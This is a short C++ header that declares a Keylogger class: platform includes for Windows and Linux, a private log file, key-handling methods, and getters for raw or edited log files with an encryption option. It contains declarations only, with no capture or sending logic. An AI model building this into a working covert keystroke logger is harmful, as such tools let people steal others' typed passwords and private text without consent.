#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#ifdef _WIN32
    #include <windows.h>
#elif __linux__

#else
  #error "OS not supperted."
#endif

#include <fstream>
#include <string>

class Keylogger {
    private:
        std::string fileName;
        std::fstream logFile;

        void logToFile(const std::string key);
        void asciiInput();
        bool actionInput(const char key);

        bool execute;

    public:
        Keylogger(const std::string _fileName) : fileName(_fileName) {
            execute = true;
        };

        std::fstream getRawFile(const std::string _fileName, bool encrypt);
        std::fstream getEditedFile(const std::string _fileName, bool encrypt);
};

#endif
